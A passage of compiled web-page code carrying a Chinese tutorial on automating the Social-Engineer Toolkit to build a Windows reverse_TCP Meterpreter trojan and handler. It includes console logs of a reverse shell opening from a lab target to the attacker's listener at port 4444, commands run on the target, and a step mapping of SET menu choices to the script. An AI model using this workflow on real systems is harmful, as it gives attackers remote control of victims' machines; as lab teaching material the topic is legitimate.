"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Meterpreter session "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" opened "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130:1100"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-01-27 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("14")]),s._v(":41:13 +0800\n\n此时我们按下回车，并输入sessions命令\n\nmsf5 exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" sessions\n\nActive sessions\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\n\n  Id  Name  Type                     Information                    Connection\n  --  ----  ----                     -----------                    ----------\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("         meterpreter x86/windows  LIUYAZHUANG"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("lyz @ LIUYAZHUANG  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130:1100 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[s._v("可以看到靶机和攻击机之间建立了Meterpreter连接。")]),s._v(" "),a("p",[s._v("接着，我们输入sessions -i 1 命令进入Meterpreter命令行，具体如下：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("msf5 exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" sessions "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Starting interaction with "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n\nmeterpreter "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" ipconfig\n\nInterface  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v("\nName         "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" MS TCP Loopback interface\nHardware MAC "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" 00:00:00:00:00:00\nMTU          "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1520")]),s._v("\nIPv4 Address "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1\n\n\nInterface  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v("\nName         "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" AMD PCNET Family PCI Ethernet Adapter - rface\nHardware MAC "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" 00:0c:29:5d:8e:d4\nMTU          "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1500")]),s._v("\nIPv4 Address "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130\nIPv4 Netmask "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("255.255")]),s._v(".255.0\n\nmeterpreter "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("p",[s._v("可见，我们已经利用社会工程学工具包，顺利拿下了目标机的Meterpreter权限。")]),s._v(" "),a("p",[s._v("接下来，我们就分析一下，SET框架是如何和se-script脚本中的参数进行关联的。")]),s._v(" "),a("h2",{attrs:{id:"分析set框架与se-script脚本的关系"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#分析set框架与se-script脚本的关系"}},[s._v("#")]),s._v(" 分析SET框架与se-script脚本的关系")]),s._v(" "),a("p",[s._v("在第5步中，我们只是输入了./seautomate se-script 命令，然后双击了exe木马文件，就拿到了靶机的meterpreter权限。这一切都是SET框架自动执行的结果，那么SET框架是如何自动执行的呢？下面我们就具体分析这个过程。")]),s._v(" "),a("p",[s._v("在分析的过程中，我们手动执行SET框架的每一个步骤，然后对比我们的脚本文件se-script中的内容。")]),s._v(" "),a("h2",{attrs:{id:"启动set框架"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#启动set框架"}},[s._v("#")]),s._v(" 启动SET框架")]),s._v(" "),a("p",[s._v("在/usr/share/set目录下输入命令：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./setoolkit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("启动SET框架")]),s._v(" "),a("h2",{attrs:{id:"选择攻击菜单"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#选择攻击菜单"}},[s._v("#")]),s._v(" 选择攻击菜单")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211426492.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("这里，我们选择1，社会工程学攻击")]),s._v(" "),a("h2",{attrs:{id:"攻击方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击方式"}},[s._v("#")]),s._v(" 攻击方式")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211458435.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("这里，选择4，创建一个Payload和Listener。")]),s._v(" "),a("h2",{attrs:{id:"选择攻击载荷"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#选择攻击载荷"}},[s._v("#")]),s._v(" 选择攻击载荷")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211520831.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("这里选择2，Windows Reverse_TCP Meterpreter")]),s._v(" "),a("h2",{attrs:{id:"设置监听ip和端口"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置监听ip和端口"}},[s._v("#")]),s._v(" 设置监听IP和端口")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211552521.png",loading:"lazy"}})]),s._v(" "),a("h2",{attrs:{id:"是否立即启动"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#是否立即启动"}},[s._v("#")]),s._v(" 是否立即启动")]),s._v(" "),a("p",[s._v("这里，询问是否立即启动攻击载荷和监听配置，这里输入yes")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211614131.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("此时，便进入了Metasploit命令行")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211632634.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("此时，我们双击下靶机上的exe木马，命令行输出如下信息：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Started reverse TCP handler on "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 \nmsf5 exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Sending stage "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("179779")]),s._v(" bytes"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" to "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Meterpreter session "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" opened "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130:1105"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-01-27 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("15")]),s._v(":03:32 +0800\n\nmsf5 exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" sessions\n\nActive sessions\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\n\n  Id  Name  Type                     Information                    Connection\n  --  ----  ----                     -----------                    ----------\n  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("         meterpreter x86/windows  LIUYAZHUANG"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("lyz @ LIUYAZHUANG  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130:1105 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[s._v("如下图：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211716197.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("此时，我们输入sessions -i 1进入Meterpreter命令行。")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211735407.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("此时，我们同样拿下了靶机的Meterpreter权限。")]),s._v(" "),a("h2",{attrs:{id:"对比分析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对比分析"}},[s._v("#")]),s._v(" 对比分析")]),s._v(" "),a("p",[s._v("在我们手动启动SET进行攻击的时候，依次输入了：1->4->2->192.168.175.128->4444-yes")]),s._v(" "),a("p",[s._v("再来看我们的se-script脚本：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211808815.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("正好一一对应，")]),s._v(" "),a("p",[a("strong",[s._v("注意：脚本的第一行为空行。")])]),s._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);